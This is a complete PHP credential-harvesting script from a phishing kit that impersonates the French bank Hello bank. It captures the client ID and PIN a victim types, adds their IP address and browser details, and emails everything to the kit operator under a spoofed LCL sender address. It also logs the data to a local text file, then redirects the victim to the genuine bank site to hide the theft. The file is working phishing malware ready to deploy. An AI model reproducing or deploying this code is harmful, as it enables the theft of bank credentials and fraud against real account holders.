<?php
@ini_set('display_errors',0);
#################################################
#                                               #
#         ||~~ BY ~~ Mr ghost ma ~~||           #
#                                               #
#       ||~ http://fb.com/Not.work404 ~||       #
#                                               #
#        ||~ http://www.mr-ghost.ma ~||         #
#                                               #
#################################################
include('Your_______Mail.php');
$var1=$_POST['user'];
$var2=$_POST['userpass'];
if(strlen($var2) == 6 and strlen($var1) == 10)
{
if (filter_var($var2, FILTER_VALIDATE_INT) and filter_var($var1, FILTER_VALIDATE_INT)){
$ip = getenv("REMOTE_ADDR");
$message  = "
++========[ Info login]========++
Identifiant     :  ".$_POST['user']."
Mot de passe    :  ".$_POST['userpass']."
++========[ Info IP - PC ]=========++
IP Geo          :   http://www.geoiptool.com/?IP=".$ip."
IP Info         :  ".$ip." |  On ".gmdate('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
++===========[ Final]============++
";
$subject = " ".$var1." Hello bank ".$ip." ";
$headers = "From: Hello Result <login@LCL.fr>";
mail($emailku, $subject, $message, $headers);
$file = fopen("./result hello bank.txt", 'a');
fwrite($file, $message);
header("location: https://www.hellobank.fr/fr/espace-client");
}
else {
header("location:./index.php?loginError_id=error");
}
}
else {
header("location:./index.php?loginError_id=error");
}
?>